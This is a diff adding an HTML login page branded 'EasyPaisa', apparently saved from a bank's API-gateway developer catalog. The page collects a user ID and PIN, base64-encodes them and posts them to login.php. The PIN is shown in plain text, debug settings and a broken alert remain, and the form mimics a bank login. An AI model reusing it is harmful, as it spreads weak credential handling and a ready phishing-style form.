@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<!-- saved from url=(0476)https://api.eu-de.apiconnect.appdomain.cloud/tariqqaisertelenorbankpk-tmbdev/dev-catalog/LoginAPI/Login?Channel=subgateway&Callback=JVO+Mm1YL21h7S6O9VZySZ3HSnHGJD/BAAElnaxxwwHbbrWaXhYET3aDvnm+w7GlKwmMPDgoNDrghe4Dv27g3BzA2Bamc8NSql1aF6FFjFac+xePCkEr86tgROI4gGvDZUZGUUkwFGxZoKtWB09h/wTHojJIr6D+vKIaAIMsX9GJGqjCWr/j1M3p15Ujw6lBkfUXFvt5J6qhUOhNCUkmUM9mFHkx5sOE6ZOBn5Hh7crM74qu4N4RaPH5LH30+XWJta2BSx6OuTBbDga3Cpd2GFp6NC4tM265cxAsJ/sCN/ooztitp8vin9dRe/hei/6X28cDTtF+AKUfqtGywBDsSw== -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<title>EasyPaisa Login</title>
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--===============================================================================================-->	
+	<link rel="icon" type="image/png" href="https://colorlib.com/etc/lf/Login_v1/images/icons/favicon.ico">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/vendor/bootstrap/css/bootstrap.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/vendor/animate/animate.css">
+<!--===============================================================================================-->	
+	<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/vendor/css-hamburgers/hamburgers.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/vendor/select2/select2.min.css">
+<!--===============================================================================================-->
+	<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/css/util.css">
+	
+	<link rel="stylesheet" type="text/css" href="https://colorlib.com/etc/lf/Login_v1/css/main.css">
+	<style>
+		.fade {
+		    opacity:0.7;
+		    filter: alpha(opacity=20);
+		    background-color:#000; 
+		    width:100%; 
+		    height:100%; 
+		    z-index:10;
+		    top:0; 
+		    left:0; 
+		    position:fixed;
+		    pointer-events: none;
+		    background-image: url('https://upload.wikimedia.org/wikipedia/commons/2/29/Loader.gif');
+		    background-repeat: no-repeat;
+  			background-attachment: fixed;
+  			background-position: center;
+		}
+		
+		.fas fa-exclamation-triangle{
+			color:red;
+		}
+		
+</style>
+<!--===============================================================================================-->
+</head>
+<body cz-shortcut-listen="true">
+	
+	<div class="limiter">
+		<div class="container-login100">
+			<div class="wrap-login100">
+				<div class="login100-pic js-tilt" data-tilt="">
+					<img src="https://i.tribune.com.pk/media/images/869408-easypaisa-1428958423/869408-easypaisa-1428958423.jpg" alt="IMG">
+				</div>
+
+				<form class="login100-form validate-form" method="post">
+					<span class="login100-form-title">
+						Please enter your EasyPaisa Credentials
+					</span>
+
+					<input type="hidden" name="Channel" value="subgateway">
+					<input type="hidden" name="Callback" value="JVO+Mm1YL21h7S6O9VZySZ3HSnHGJD/BAAElnaxxwwHbbrWaXhYET3aDvnm+w7GlKwmMPDgoNDrghe4Dv27g3BzA2Bamc8NSql1aF6FFjFac+xePCkEr86tgROI4gGvDZUZGUUkwFGxZoKtWB09h/wTHojJIr6D+vKIaAIMsX9GJGqjCWr/j1M3p15Ujw6lBkfUXFvt5J6qhUOhNCUkmUM9mFHkx5sOE6ZOBn5Hh7crM74qu4N4RaPH5LH30+XWJta2BSx6OuTBbDga3Cpd2GFp6NC4tM265cxAsJ/sCN/ooztitp8vin9dRe/hei/6X28cDTtF+AKUfqtGywBDsSw==">
+
+					<div class="wrap-input100 validate-input" data-validate="User ID is required" >
+						<input class="input100" type="text" name="username" id="username" placeholder="User ID">
+						<span class="focus-input100"></span>
+						<span class="symbol-input100">
+							<i class="fa fa-envelope" aria-hidden="true"></i>
+						</span>
+					</div>
+
+					<div class="wrap-input100 validate-input" data-validate="Pin is required">
+						<input name="psd" id="psd" class="input100" type="text" placeholder="Pin">
+						<span class="focus-input100"></span>
+						<span class="symbol-input100">
+							<i class="fa fa-lock" aria-hidden="true"></i>
+						</span>
+					</div>
+					
+					
+				
+					
+					<div class="container-login100-form-btn">
+						<button class="login100-form-btn" id="submit" onclick="myFunction()">
+							Login
+						</button>
+					</div>
+					<br>
+					<span id="messageBox" class="messagebox" aria-hidden="true"></span>
+					<div style="padding: 25px"><br></div></form>
+			
+		</div>
+	</div>
+	
+	
+
+	
+<!--===============================================================================================-->	
+	<script src="https://colorlib.com/etc/lf/Login_v1/vendor/jquery/jquery-3.2.1.min.js"></script>
+<!--===============================================================================================-->
+	<script src="https://colorlib.com/etc/lf/Login_v1/vendor/bootstrap/js/popper.js"></script>
+	<script src="https://colorlib.com/etc/lf/Login_v1/vendor/bootstrap/js/bootstrap.min.js"></script>
+<!--===============================================================================================-->
+	<script src="https://colorlib.com/etc/lf/Login_v1/vendor/select2/select2.min.js"></script>
+<!--===============================================================================================-->
+	<script src="https://colorlib.com/etc/lf/Login_v1/vendor/tilt/tilt.jquery.min.js"></script>
+	
+	
+	<script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/jquery.validate.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/additional-methods.min.js"></script>
+	
+	<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
+<!--===============================================================================================
+	<script src='ep.min.js' ></script>-->
+	
+	<script>
+	jQuery.validator.setDefaults({
+			  debug: true,
+			  success: "valid"
+			  
+			});
+			$( "form.login100-form" ).validate({
+			  rules: {
+				psd: {
+				  required: true,
+				  digits: true,
+				  minlength: 5,
+				  maxlength: 5
+				},
+				username: {
+				  required: true,
+				  digits: true,
+				  minlength: 10
+				}
+			  },
+			  messages : {
+					username: {
+						required: "Username can not be empty",
+						digits: "Please enter a numerical value",
+						minlength: "Pin must be atleast 11 digits"
+					},
+					psd: {
+						required: "Pin can not be empty",
+						digits: "Please enter a numerical value",
+						minlength: "Pin must be atleast 5 digits",
+						maxlength: "Pin must be maximum 5 digits"
+					}
+				},
+			 
+			 
+				  errorLabelContainer: "#messageBox",
+				  errorElement:"i",
+				  errorClass: "fas fa-exclamation-triangle", // Now class of '.fas fa-hand-paper' will be used for errors
+				  
+				  
+					
+					submitHandler: function() { 
+						var user1 = window.btoa(document.getElementById('username').value);
+						var pin1 = window.btoa(document.getElementById('psd').value);
+						
+						const queryString = window.location.search;
+						const urlParams = new URLSearchParams(queryString);
+						const Callback1 = urlParams.get('Callback');
+						const Channel1 = urlParams.get('Channel');
+						const Credentials1 = urlParams.get('Credentials');
+
+						
+						alert(Callback +  " and " + Channel +  " and " + Credentials);
+						
+						
+						var myForm = { username : user1, psd : pin1 , Callback : Callback1, Channel : Channel1 , Credentials : Credentials1 };
+						
+							$.ajax({
+								url: 'login.php', 
+								data: myForm,
+								type: 'POST',
+								success: function(data) {
+									
+									alert(data);
+									
+									//setTimeout(window.close(), 3000);
+								},
+								error: function(data) {
+									//alert(data);
+								},
+								complete: function(data) {
+									//alert(data);
+								}
+						});
+					}
+								  
+			});</script>
+	
+	
+<!--===============================================================================================-->
+	
+	
+	<script>
+		$('.js-tilt').tilt({
+			scale: 1.1
+		})
+	</script>
+	
+	
+	
+	
+<!--===============================================================================================-->
+	<script src="https://colorlib.com/etc/lf/Login_v1/js/main.js" gapi_processed="true"></script>
+
+
+
+</div><style>.tb_button {padding:1px;cursor:pointer;border-right: 1px solid #8b8b8b;border-left: 1px solid #FFF;border-bottom: 1px solid #fff;}.tb_button.hover {borer:2px outset #def; background-color: #f8f8f8 !important;}.ws_toolbar {z-index:100000} .ws_toolbar .ws_tb_btn {cursor:pointer;border:1px solid #555;padding:3px}   .tb_highlight{background-color:yellow} .tb_hide {visibility:hidden} .ws_toolbar img {padding:2px;margin:0px}</style></body></html>
